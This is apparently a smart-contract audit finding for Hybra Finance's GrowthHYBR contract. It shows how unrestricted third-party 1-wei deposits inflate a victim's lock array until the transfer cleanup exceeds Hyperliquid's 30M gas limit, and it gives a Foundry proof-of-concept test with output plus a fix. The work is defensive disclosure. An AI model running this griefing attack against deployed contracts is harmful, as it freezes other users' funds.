  "body": "## Overview\n\nThe `GrowthHYBR.deposit()` function allows any address to deposit tokens on behalf of any recipient, creating an unbounded array of lock entries in `userLocks[recipient]`. An attacker can exploit this by making thousands of 1-wei deposits for a victim, causing the victim's token transfers to trigger expensive array cleanup operations in `_cleanExpired()` that exceed Hyperliquid's 30M gas block limit ([source](https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm/dual-block-architecture)), effectively freezing the victim's tokens at minimal cost to the attacker.\n\n## Vulnerability Description\n\nThe GrowthHYBR contract (in GovernanceHYBR.sol) implements time-locked tokens where deposits create lock entries expiring after 24 hours. The vulnerability combines unrestricted third-party deposits with unbounded array growth, causing expensive cleanup operations during transfers.\n\nLine 126 of `deposit()` allows anyone to deposit for any recipient without access control:\n\n```solidity\n// GovernanceHYBR.sol:124-153\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\n    require(amount > 0, \"Zero amount\");\n    recipient = recipient == address(0) ? msg.sender : recipient;  // ← Allows third-party deposits!\n    // ... logic ...\n    _addTransferLock(recipient, shares);  // ← Creates unbounded lock array\n}\n```\n\nEach deposit appends to `userLocks[recipient]` with no minimum amount requirement (line 271), enabling attackers to create thousands of 1-wei locks. The DoS occurs during token transfers when `_beforeTokenTransfer()` calls `_cleanExpired()` to remove expired locks:\n\n```solidity\n// GovernanceHYBR.sol:332-357\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n    // ... fast-path check ...\n    if (currentAvailable < amount) {\n        _cleanExpired(from);  // ← EXPENSIVE: Iterates ALL locks!\n    }\n}\n```\n\nThe `_cleanExpired()` function (lines 303-326) iterates through the ENTIRE `userLocks` array to compact it, reading all storage slots, writing to reorder non-expired entries, and popping expired entries:\n\n```solidity\n// GovernanceHYBR.sol:303-326\nfunction _cleanExpired(address user) internal returns (uint256 freed) {\n    for (uint256 i = 0; i < len; i++) {  // ← Iterates ALL 4,000+ locks\n        // ... cleanup logic ...\n    }\n    while (arr.length > write) {\n        arr.pop();  // ← Multiple storage deletions\n    }\n}\n```\n\nWith 4,000+ locks, this cleanup consumes 30-40M gas (reading 4,000 slots + array compaction + storage deletions), exceeding Hyperliquid's 30M gas slow block limit ([source](https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm/dual-block-architecture)) and reverting all transfer attempts. An attacker spends 4,000 wei HYBR (~$0.000000001) plus ~$100 gas to freeze millions in victim assets.\n\n## Code Location\n\n**GovernanceHYBR.sol (GrowthHYBR contract)**\n- [`deposit()` function (L124-L153)](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/GovernanceHYBR.sol#L124-L153) - Allows unrestricted third-party deposits\n- [`_addTransferLock()` function (L269-L276)](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/GovernanceHYBR.sol#L269-L276) - Unbounded array append\n- [`_cleanExpired()` function (L303-L326)](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/GovernanceHYBR.sol#L303-L326) - Gas-intensive full array iteration\n- [`_beforeTokenTransfer()` hook (L332-L357)](https://github.com/code-423n4/2025-10-hybra-finance/blob/66c42f3c9754f1b38942c69ebc0d3e4c0f8fdeb2/ve33/contracts/GovernanceHYBR.sol#L332-L357) - Triggers cleanup on transfers\n\n## Impact\n\nThis vulnerability enables griefing where an attacker spending ~$100 can freeze millions in victim assets. The attack causes complete DoS on token transfers and withdrawals via 30-40M gas cleanup that exceeds Hyperliquid's 30M gas slow block limit ([source](https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm/dual-block-architecture)).\n\nThe attack sustains indefinitely—while individual locks expire after 24 hours, attackers continuously deposit new locks before expiry, maintaining permanent DoS for ~$100/day. Victims cannot transfer, withdraw, or rebalance positions during market volatility, creating direct financial losses.\n\nAny user holding gHYBR tokens can be targeted. DeFi integrations (pools, lending, vaults) face particularly severe risk since smart contracts cannot manually clean up or migrate to new addresses, enabling permanent griefing. \n\n## Mitigation\n\nThe recommended mitigation addresses the root cause by restricting third-party deposits. Modify the `deposit()` function to only allow deposits for `msg.sender`:\n\n```solidity\n// GovernanceHYBR.sol:124-153 - Restrict deposit() to prevent griefing\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\n    require(amount > 0, \"Zero amount\");\n    require(recipient == address(0) || recipient == msg.sender, \"Cannot deposit for others\");\n    recipient = msg.sender;  // Force recipient to be msg.sender\n\n    // ... rest of function unchanged\n}\n```\n\nThis single change eliminates the griefing vector by preventing attackers from inflating victim lock arrays. Users can only create locks for themselves.",
  "proof_of_concept": "## Proof of Concept\n\nThe following test demonstrates the griefing attack by creating 4,000 lock entries that cause transfers to exceed Hyperliquid's 30M gas slow block limit. Add this test to `ve33/test/C4PoC.t.sol`:\n\n```solidity\n\nfunction test_HIGH4_UnboundedArrayDoS() external {\n    address attacker = makeAddr(\"attacker\");\n    address victim = makeAddr(\"victim\");\n    address recipient = makeAddr(\"recipient\");\n\n    // Phase 1: Setup\n    console2.log(\"=== Phase 1: Setup ===\");\n\n    // Give victim legitimate HYBR balance\n    deal(address(hybr), victim, 10000e18);\n\n    // Give attacker minimal amount for grief attack (4000 wei)\n    deal(address(hybr), attacker, 4000);\n\n    console2.log(\"Victim HYBR balance: 10000e18\");\n    console2.log(\"Attacker HYBR balance: 4000 wei\");\n\n    // Phase 2: Victim deposits legitimately\n    console2.log(\"\\n=== Phase 2: Victim Legitimate Deposit ===\");\n\n    vm.startPrank(victim);\n    hybr.approve(address(gHybr), 10000e18);\n    gHybr.deposit(10000e18, victim);\n    vm.stopPrank();\n\n    uint256 victimBalance = gHybr.balanceOf(victim);\n    console2.log(\"Victim gHYBR balance:\", victimBalance);\n\n    uint256 initialLocks = gHybr.getUserLocks(victim).length;\n    console2.log(\"Victim locks count:\", initialLocks);\n\n    // Phase 3: Attacker griefs victim with many tiny deposits\n    console2.log(\"\\n=== Phase 3: Attacker Grief Attack ===\");\n    console2.log(\"Attacker depositing 1 wei 4000 times for victim...\");\n\n    vm.startPrank(attacker);\n    hybr.approve(address(gHybr), 4000);\n\n    for (uint256 i = 0; i < 4000; i++) {\n        gHybr.deposit(1, victim);  // Third-party deposit allowed!\n    }\n    vm.stopPrank();\n\n    uint256 locksAfterAttack = gHybr.getUserLocks(victim).length;\n    console2.log(\"Victim locks after attack:\", locksAfterAttack);\n    console2.log(\"Attack cost: 4000 wei HYBR\");\n\n    // Phase 4: Prove transfer is DoS'd\n    console2.log(\"\\n=== Phase 4: Prove DoS ===\");\n\n    // Advance 1 hour so victim's original lock expires and cleanup is needed\n    vm.warp(block.timestamp + 1 hours);\n\n    uint256 transferAmount = victimBalance / 2;\n    console2.log(\"Attempting transfer:\", transferAmount);\n\n    // Try transfer with 30M gas limit (Hyperliquid slow block limit)\n    vm.prank(victim);\n    try gHybr.transfer{gas: 30_000_000}(recipient, transferAmount) {\n        revert(\"Transfer should have failed with 30M gas\");\n    } catch {\n        console2.log(\"Transfer REVERTED with 30M gas limit!\");\n    }\n\n    // Verify victim still has balance but cannot transfer\n    uint256 victimFinalBalance = gHybr.balanceOf(victim);\n    uint256 recipientBalance = gHybr.balanceOf(recipient);\n    console2.log(\"Victim balance:\", victimFinalBalance);\n    console2.log(\"Recipient balance:\", recipientBalance);\n    console2.log(\"Tokens frozen - victim cannot transfer!\");\n\n    // Phase 5: Show transfer works without gas limit (after locks expire)\n    console2.log(\"\\n=== Phase 5: Verify Transfer Works Without Gas Limit ===\");\n\n    // Advance time so ALL attack locks expire\n    vm.warp(block.timestamp + 25 hours);\n    console2.log(\"Advanced 25 hours (locks now expired)\");\n\n    // Transfer succeeds without gas limit after cleanup\n    vm.prank(victim);\n    gHybr.transfer(recipient, transferAmount);\n\n    console2.log(\"Transfer succeeded without gas limit!\");\n    console2.log(\"Recipient received:\", gHybr.balanceOf(recipient));\n\n    console2.log(\"\\n=== CONCLUSION ===\");\n    console2.log(\"Attacker spent: 4000 wei HYBR\");\n    console2.log(\"Victim's 10000e18 gHYBR frozen for 24+ hours\");\n    console2.log(\"During freeze period, victim cannot transfer/sell tokens\");\n    console2.log(\"DoS attack successful with minimal cost!\");\n}\n```\n\n**Running the Test:**\n\n```bash\ncd ve33\nforge test --match-test test_HIGH4_UnboundedArrayDoS -vv\n```\n\n**Note:** The test suite takes approximately 60 seconds to compile due to the complexity of the protocol's contract dependencies.\n\n**Output:**\n\n```\n[PASS] test_HIGH4_UnboundedArrayDoS() (gas: 813644480)\nLogs:\n  === Phase 1: Setup ===\n  Victim HYBR balance: 10000e18\n  Attacker HYBR balance: 4000 wei\n\n  === Phase 2: Victim Legitimate Deposit ===\n  Victim gHYBR balance: 10000000000000000000000\n  Victim locks count: 1\n\n  === Phase 3: Attacker Grief Attack ===\n  Attacker depositing 1 wei 4000 times for victim...\n  Victim locks after attack: 4001\n  Attack cost: 4000 wei HYBR\n\n  === Phase 4: Prove DoS ===\n  Attempting transfer: 5000000000000000000000\n  Transfer REVERTED with 30M gas limit!\n  Victim balance: 10000000000000000000000\n  Recipient balance: 0\n  Tokens frozen - victim cannot transfer!\n\n  === Phase 5: Verify Transfer Works Without Gas Limit ===\n  Advanced 25 hours (locks now expired)\n  Transfer succeeded without gas limit!\n  Recipient received: 5000000000000000000000\n\n  === CONCLUSION ===\n  Attacker spent: 4000 wei HYBR\n  Victim's 10000e18 gHYBR frozen for 24+ hours\n  During freeze period, victim cannot transfer/sell tokens\n  DoS attack successful with minimal cost!\n```\n\nThe test demonstrates that an attacker spending 4,000 wei of HYBR plus gas costs can create 4,000 lock entries that cause the victim's `_cleanExpired()` cleanup to exceed the 30M gas limit during transfers, effectively freezing the victim's funds. The attack can be repeated indefinitely by depositing new locks before old ones expire, maintaining permanent DoS at minimal ongoing cost.",
